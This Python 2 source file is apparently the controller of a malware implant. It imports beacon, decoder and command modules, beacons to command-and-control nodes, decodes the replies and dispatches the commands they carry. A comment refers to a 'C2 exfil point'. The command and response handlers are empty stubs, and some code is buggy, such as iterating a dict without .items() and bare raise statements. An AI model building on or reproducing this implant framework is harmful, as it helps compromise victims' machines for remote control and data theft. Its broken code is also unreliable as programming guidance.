#!/usr/bin/env python

#
# This is the application controller that manages the calls through all the different types of modules
#

import inspect
import sys
import warnings

# TODO:
#
# - Parse XML to build mappings
# - Considering wrapping each node into a Node class upon initial import.
# - Fix easy_import and abstract_builder so you can hand it a list of the modules for a package (beacons, commands, etc), since the import can receive a list. More efficient.

BEACON_TYPE_IND = 0
PARAMS_IND = 1
MODULE_PATH = 'implant_modules'
BEACON_PKG = MODULE_PATH + '.' + 'beacons'
COMMAND_PKG = MODULE_PATH + '.' +'commands'
DECODER_PKG = MODULE_PATH + '.' +'decoders'

class Controller:
    
    beacon_map = {}
    decoder_map = {} # this contains lists, others are 1d
    command_map = {}
    response_map = {}
    
    def __init__(self, beacons, commands, decoders):
        self.build_handlers(beacons, commands, decoders)
    
    # ###############
    # UTILITIES
    # ###############
    
    def get_module_class(self, module):
        try:
            for name, obj in inspect.getmembers(module):
                # must check for parent module name as to avoid imported class objects
                if inspect.isclass(obj) and obj.__module__ == module.__name__:
                    return obj
                    # have it instantiate the object? depends where I decide to use this method: obj_() creates an instance.
        except Exception, e:
            print "Error getting class from %s module" % (module.__name__)
            raise

    def easy_import(self, pkg_name, module_name):
        
        try:
            pkg = __import__(pkg_name, fromlist=[module_name])
            module = getattr(pkg,module_name)
            return self.get_module_class(module)
        except ImportError ,e:
            print "Erorr importing %s from %s" % (module_name, pkg_name)
            raise
    
    def abstract_builder(self, pkg_name, name_list, return_list = False):
        
        if return_list:
            ret_val = []
        else:
            ret_val = {}
        
        for module_name in name_list:
            module_class = self.easy_import(pkg_name, module_name)
            if return_list:
                ret_val.append(module_class)
            else:
                ret_val[module_name] = module_class
            
        return ret_val
    
    # ###############    
    # HANDLER BUILDERS
    # ###############
    
    # Note:
    # I added these facades because I am unsure how this architecture will work in the long run.
    # Hence, I am using a ludicrous number of functions and facades.
    
    def build_beacon_handler(self, beacons):
        
        self.beacon_map = self.abstract_builder(BEACON_PKG, beacons)

    def build_command_handler(self, commands):
        
        self.command_map = self.abstract_builder(COMMAND_PKG, commands)
    
    def build_decoder_handler(self, decoders):
        
        self.decoder_map = self.abstract_builder(DECODER_PKG, decoders, True) #return a list
    
    def build_handlers(self, beacons, commands, decoders):
        # this function is used by the constructor to setup the dictionaries with the command to command object mapping.
        
        self.build_beacon_handler(beacons)
        self.build_command_handler(commands)
        self.build_decoder_handler(decoders)
    
    # ###############
    # HANDLER CALLERS
    # ###############
    
    def handle_beacon(self, nodes):
        # 
        # nodes example:
        # list of tuples, where each tuples first value is a string of the beacon type and second value is a dictionary of arguments
        # [('http_get',{'node':'192.168.2.2','port':'80','path':'/index.html','timeout':'10'})]
        #
        
        try:
            
            # Should I randomize the order of nodes?
            for node in nodes:
                beacon_type = node[BEACON_TYPE_IND]
                params = node[PARAMS_IND]
        
                beaconer_class = self.beacon_map.get(beacon_type) # get this from the beacon map based on beacon type
                beaconer = beaconer_class() # instantiate the object
                success, response = beaconer.beacon(params)
                
                if success:
                    return (success, response)
                else:
                    
                    # Should I pause here or just continue?
                    continue
                
            # What do I do if none of the nodes worked?
            return (False, None)
            
        except Exception,e :
            raise e
    
    def recursive_decoder(self, decoder, encoded_data):
        
        decoded_data = []
        
        for encoded_portion in encoded_data:
            
            portion_type = type(encoded_portion)
            
            if portion_type is dict:
                
                decoded_portion = {}
                
                for encoded_key, encoded_value in encoded_portion:
                    decoded_key = decoder.decode(encoded_key)
                    decoded_value = decoder.decode(encoded_value)
                    decoded_portion[decoded_key] = decoded_value
                    
                decoded_data.append(decoded_portion)
                
            elif portion_type is list or portion_type is tuple:
                decoded_data.append(self.recursive_decoder(decoder, encoded_portion))
                
            else:
                print 'Data was not formatted as dict or list!'
                raise
        
        return decoded_data
    
    def handle_decode(self, encoded_data):
        
        # while there is another decoder, run each item through the next decoder
        data = encoded_data
        success = True
        
        for decoder in self.decoder_map:
            
            current_decoder = decoder()
            data = self.recursive_decoder(current_decoder, data)
            
        return success, data
    
    def handle_command(self, command, params):
        pass
    
    def handle_response(self, results):
        pass
    
    def handle(self, nodes):
        
        try:

            # Send command to beacon handler
            success, encoded_data = self.handle_beacon(nodes)
            
            # Send response to decoders
            if success:
                success, decoded_data = self.handle_decode(encoded_data)
            else:
                raise
            
            # Process command
            if success:
                command, params = decoded_data
                success, results = self.handle_command(command, params)
            else:
                raise
            
            # Send response
            if success:
                success = self.handle_response(results)
            else:
                raise
        
        except Exception, e:
            # Here consider sending back a message to the C2 exfil point, letting them know why the implant died
            raise e
            
    
    def beacon(self, nodes):
        # facade
        self.handle(nodes)
    
    